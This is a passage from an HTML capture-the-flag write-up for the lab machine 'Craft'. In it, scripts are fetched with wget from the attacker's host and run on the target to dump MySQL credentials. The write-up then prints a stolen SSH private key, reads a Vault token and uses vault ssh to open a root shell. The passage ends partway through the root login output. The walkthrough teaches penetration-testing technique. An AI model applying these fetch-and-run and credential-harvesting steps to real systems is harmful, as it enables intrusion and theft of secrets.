+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                /opt/app&nbsp;#&nbsp;wget&nbsp;http://10.10.14.4:8000/iteration1.py<br>
+                Connecting&nbsp;to&nbsp;10.10.14.4:8000&nbsp;(10.10.14.4:8000)<br>
+                iteration1.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;|********************************|&nbsp;&nbsp;&nbsp;661&nbsp;&nbsp;0:00:00&nbsp;ETA<br>
+                <br>
+                /opt/app&nbsp;#&nbsp;python&nbsp;iteration1.py<br>
+                [{'Tables_in_craft':&nbsp;'brew'},&nbsp;{'Tables_in_craft':&nbsp;'user'}]
+            </div>
+        </div><br>
+        <br>
+        Nice! There's a <code>user</code> table. This table presumably has some loot to retrieve.<br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>5c) dbtest.py - Retrieve credentials</strong></h3><br>
+        Modify the sql script to retrieve all entries in the <code>user</code> table and serve it to the target.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;nano&nbsp;iteration2.py
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;pymysql<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;craft_api&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;settings<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;test&nbsp;connection&nbsp;to&nbsp;mysql&nbsp;database</span><br>
+                <br>
+                connection&nbsp;=&nbsp;pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user=settings.MYSQL_DATABASE_USER,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password=settings.MYSQL_DATABASE_PASSWORD,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db=settings.MYSQL_DATABASE_DB,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursorclass=pymysql.cursors.DictCursor)<br>
+                <br>
+                try:&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;connection.cursor()&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;cursor:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"select&nbsp;*&nbsp;from&nbsp;user"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursor.execute(sql)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;cursor.fetchall()&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;originally&nbsp;cursor.fetchone()</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(result)<br>
+                <br>
+                finally:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;connection.close()
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                /opt/app&nbsp;#&nbsp;wget&nbsp;http://10.10.14.4:8000/i2.py<br>
+                Connecting&nbsp;to&nbsp;10.10.14.4:8000&nbsp;(10.10.14.4:8000)<br>
+                iteration2.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;|********************************|&nbsp;&nbsp;&nbsp;668&nbsp;&nbsp;0:00:00&nbsp;ETA<br>
+                <br>
+                /opt/app&nbsp;#&nbsp;python&nbsp;iteration2.py<br>
+                [{'id':&nbsp;1,&nbsp;'username':&nbsp;'dinesh',&nbsp;'password':&nbsp;'4aUh0A8PbVJxgd'},&nbsp;{'id':&nbsp;4,&nbsp;'username':&nbsp;'ebachman',&nbsp;'password':&nbsp;'llJ77D8QFkLPQB'},&nbsp;{'id':&nbsp;5,&nbsp;'username':&nbsp;'gilfoyle',&nbsp;'password':&nbsp;'ZEU3N8WNM2rh4T'}]
+            </div>
+        </div><br>
+        <br>
+        Nice! We have some usernames and passwords.<br>
+        • <code>dinesh</code> / <code>4aUh0A8PbVJxgd</code><br>
+        • <code>ebachman</code> / <code>llJ77D8QFkLPQB</code><br>
+        • <code>gilfoyle</code> / <code>ZEU3N8WNM2rh4T</code><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) gogs.craft.htb - Gilfoye</strong></h2><br>
+        Log in to <code>gogs.craft.htb</code> as <code>gilfoyle</code> using the credentials you found from the database.<br>
+        <br>
+        <code>gilfoyle</code> / <code>ZEU3N8WNM2rh4T</code><br>
+        <br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        Click on gilfoyle's icon &gt; Your Settings &gt; Repositories and you'll find a private <code>craft-infra</code> repository<br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        It looks like he keeps his ssh keys in here...<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        He does!<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        Grab his <code>id_rsa</code> private key and log in to craft as <code>gilfoyle</code>.<br>
+        The passphrase for his key is the same as his gogs password - <code>ZEU3N8WNM2rh4T</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;nano&nbsp;gilfoyle.key<br>
+                root@gotham:~/ctf/craft#&nbsp;chmod&nbsp;600&nbsp;gilfoyle.key<br>
+                -----BEGIN&nbsp;OPENSSH&nbsp;PRIVATE&nbsp;KEY-----<br>
+                b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe<br>
+                qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z<br>
+                F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS<br>
+                zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS<br>
+                RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx<br>
+                lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw<br>
+                pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ<br>
+                B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi<br>
+                4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq<br>
+                Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ<br>
+                3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K<br>
+                Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV<br>
+                ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU<br>
+                GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5<br>
+                0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F<br>
+                5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE<br>
+                cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5<br>
+                elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf<br>
+                CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa<br>
+                hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB<br>
+                a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg<br>
+                MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W<br>
+                Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS<br>
+                Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW<br>
+                I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz<br>
+                6YvpJhnN2SfJC/QftzqZK2MndJrmQ=<br>
+                -----END&nbsp;OPENSSH&nbsp;PRIVATE&nbsp;KEY-----<br>
+                root@gotham:~/ctf/craft#&nbsp;ssh&nbsp;gilfoyle@10.10.10.110&nbsp;-i&nbsp;gilfoyle.key<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;..&nbsp;&nbsp;.&nbsp;*&nbsp;&nbsp;*<br>
+                *&nbsp;&nbsp;*&nbsp;@()Ooc()*&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp;.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(Q@*0CG*O()&nbsp;&nbsp;___<br>
+                &nbsp;&nbsp;&nbsp;|\_________/|/&nbsp;_&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;/&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;\_|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|\___/<br>
+                &nbsp;&nbsp;&nbsp;|\_|__|__|_/|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;\_________/<br>
+                <br>
+                <br>
+                &nbsp;<br>
+                Enter&nbsp;passphrase&nbsp;for&nbsp;key&nbsp;'gilfoyle.key':&nbsp;ZEU3N8WNM2rh4T<br>
+                Linux&nbsp;craft.htb&nbsp;4.9.0-8-amd64&nbsp;#1&nbsp;SMP&nbsp;Debian&nbsp;4.9.130-2&nbsp;(2018-10-27)&nbsp;x86_64<br>
+                <br>
+                The&nbsp;programs&nbsp;included&nbsp;with&nbsp;the&nbsp;Debian&nbsp;GNU/Linux&nbsp;system&nbsp;are&nbsp;free&nbsp;software;<br>
+                the&nbsp;exact&nbsp;distribution&nbsp;terms&nbsp;for&nbsp;each&nbsp;program&nbsp;are&nbsp;described&nbsp;in&nbsp;the<br>
+                individual&nbsp;files&nbsp;in&nbsp;/usr/share/doc/*/copyright.<br>
+                <br>
+                Debian&nbsp;GNU/Linux&nbsp;comes&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent<br>
+                permitted&nbsp;by&nbsp;applicable&nbsp;law.<br>
+                gilfoyle@craft:~$
+            </div>
+        </div><br>
+        <br>
+        We're in! You can grab <code>user.txt</code> at this point.<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;ls<br>
+                user.txt<br>
+                gilfoyle@craft:~$&nbsp;cat&nbsp;user.txt<br>
+                bbf4b0...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Vault</strong></h2><br>
+        List the contents of <code>gilfoyle</code>'s home directory<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;68K<br>
+                drwx------&nbsp;4&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Aug&nbsp;19&nbsp;06:31&nbsp;.<br>
+                drwxr-xr-x&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;..<br>
+                -rw-r--r--&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;634&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.bashrc<br>
+                drwx------&nbsp;3&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.config<br>
+                -rwxr-xr-x&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;31K&nbsp;Aug&nbsp;17&nbsp;22:59&nbsp;lse.sh<br>
+                -rw-r--r--&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;148&nbsp;Feb&nbsp;&nbsp;8&nbsp;&nbsp;2019&nbsp;.profile<br>
+                drwx------&nbsp;2&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.ssh<br>
+                -r--------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;&nbsp;33&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;user.txt<br>
+                -rw-------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;&nbsp;&nbsp;36&nbsp;Aug&nbsp;19&nbsp;07:16&nbsp;.vault-token<br>
+                -rw-------&nbsp;1&nbsp;gilfoyle&nbsp;gilfoyle&nbsp;2.5K&nbsp;Feb&nbsp;&nbsp;9&nbsp;&nbsp;2019&nbsp;.viminfo
+            </div>
+        </div><br>
+        <br>
+        <code>.vault-token</code> looks interesting.<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;cat&nbsp;.vault-token<br>
+                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+            </div>
+        </div><br>
+        <br>
+        If you google <code>.vault_token</code> you'll find that it's part of a software called <code>Vault</code>, which (according to the site) is a sort of virtual filesystem that will hold sensitive information/keys/passwords.<br>
+        <br>
+        You can log in to <code>Vault</code> using the key.<br>
+        It looks like we have root permissions with this key.<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;vault&nbsp;login<br>
+                Token&nbsp;(will&nbsp;be&nbsp;hidden):&nbsp;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>
+                Success!&nbsp;You&nbsp;are&nbsp;now&nbsp;authenticated.&nbsp;The&nbsp;token&nbsp;information&nbsp;displayed&nbsp;below<br>
+                is&nbsp;already&nbsp;stored&nbsp;in&nbsp;the&nbsp;token&nbsp;helper.&nbsp;You&nbsp;do&nbsp;NOT&nbsp;need&nbsp;to&nbsp;run&nbsp;"vault&nbsp;login"<br>
+                again.&nbsp;Future&nbsp;Vault&nbsp;requests&nbsp;will&nbsp;automatically&nbsp;use&nbsp;this&nbsp;token.<br>
+                <br>
+                Key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Value<br>
+                ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----<br>
+                token&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>
+                token_accessor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1dd7b9a1-f0f1-f230-dc76-46970deb5103<br>
+                token_duration&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;∞<br>
+                token_renewable&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false<br>
+                token_policies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;["root"]<br>
+                identity_policies&nbsp;&nbsp;&nbsp;&nbsp;[]<br>
+                policies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;["root"]
+            </div>
+        </div><br>
+        <br>
+        If you check <code>vault</code>'s help, you'll see some commands for reading secrets.<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;vault&nbsp;-h<br>
+                Usage:&nbsp;vault&nbsp;&lt;command&gt;&nbsp;[args]<br>
+                <br>
+                Common&nbsp;commands:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;read&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Read&nbsp;data&nbsp;and&nbsp;retrieves&nbsp;secrets<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;write&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write&nbsp;data,&nbsp;configuration,&nbsp;and&nbsp;secrets<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;delete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Delete&nbsp;secrets&nbsp;and&nbsp;configuration<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;data&nbsp;or&nbsp;secrets<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Authenticate&nbsp;locally<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;agent&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;a&nbsp;Vault&nbsp;agent<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start&nbsp;a&nbsp;Vault&nbsp;server<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Print&nbsp;seal&nbsp;and&nbsp;HA&nbsp;status<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;unwrap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unwrap&nbsp;a&nbsp;wrapped&nbsp;secret<br>
+                <br>
+                Other&nbsp;commands:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;audit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;audit&nbsp;devices<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;auth&nbsp;methods<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;kv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;Vault's&nbsp;Key-Value&nbsp;storage<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;lease&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;leases<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;namespace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;namespaces<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;operator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Perform&nbsp;operator-specific&nbsp;tasks<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;path-help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Retrieve&nbsp;API&nbsp;help&nbsp;for&nbsp;paths<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;plugin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;Vault&nbsp;plugins&nbsp;and&nbsp;catalog<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;policy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;policies<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secrets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;secrets&nbsp;engines<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Initiate&nbsp;an&nbsp;SSH&nbsp;session<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;token&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Interact&nbsp;with&nbsp;tokens
+            </div>
+        </div><br>
+        <br>
+        Back on <code>gilfoyle</code>'s <code>craft_infra</code> gogs repository, you'll see a folder called <code>vault</code>.<br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        Inside it, you'll find a secret that <code>gilfoyle</code> has set up.<br>
+        <img alt="images\2-15.png" src="images/2-15.png"><br>
+        <br>
+        <img alt="images\2-16.png" src="images/2-16.png"><br>
+        <br>
+        If we read the data at this <code>ssh/roles/root_otp</code> secret, there's nothing there.<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;vault&nbsp;read&nbsp;ssh/roles/root_otp<br>
+                Key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Value<br>
+                ---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----<br>
+                allowed_users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n/a<br>
+                cidr_list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0/0,10.10.10.110/23<br>
+                default_user&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root<br>
+                exclude_cidr_list&nbsp;&nbsp;&nbsp;&nbsp;n/a<br>
+                key_type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;otp<br>
+                port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;22
+            </div>
+        </div><br>
+        <br>
+        From the output of <code>vault</code>'s <code>help</code> earlier, there was an ssh command.<br>
+        <br>
+        Considering the above is an <code>ssh</code> secret, vault's <code>ssh</code> command is probably of interest.<br>
+        Vault docs for the <code>ssh</code> command are here - <a href="https://www.vaultproject.io/docs/commands/ssh.html">https://www.vaultproject.io/docs/commands/ssh.html</a><br>
+        <br>
+        With <code>vault ssh</code>, we can get a root shell!<br>
+            <div class="codebox">
+                gilfoyle@craft:~$&nbsp;vault&nbsp;ssh&nbsp;-mode=otp&nbsp;-role=root_otp&nbsp;root@10.10.10.110<br>
+                Vault&nbsp;could&nbsp;not&nbsp;locate&nbsp;"sshpass".&nbsp;The&nbsp;OTP&nbsp;code&nbsp;for&nbsp;the&nbsp;session&nbsp;is&nbsp;displayed<br>
+                below.&nbsp;Enter&nbsp;this&nbsp;code&nbsp;in&nbsp;the&nbsp;SSH&nbsp;password&nbsp;prompt.&nbsp;If&nbsp;you&nbsp;install&nbsp;sshpass,<br>
+                Vault&nbsp;can&nbsp;automatically&nbsp;perform&nbsp;this&nbsp;step&nbsp;for&nbsp;you.<br>
+                OTP&nbsp;for&nbsp;the&nbsp;session&nbsp;is:&nbsp;7ae5ce54-450d-e696-e628-fa9e81e2a9ba<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;..&nbsp;&nbsp;.&nbsp;*&nbsp;&nbsp;*<br>
+                *&nbsp;&nbsp;*&nbsp;@()Ooc()*&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp;.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(Q@*0CG*O()&nbsp;&nbsp;___<br>
+                &nbsp;&nbsp;&nbsp;|\_________/|/&nbsp;_&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;/&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;\_|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|\___/<br>
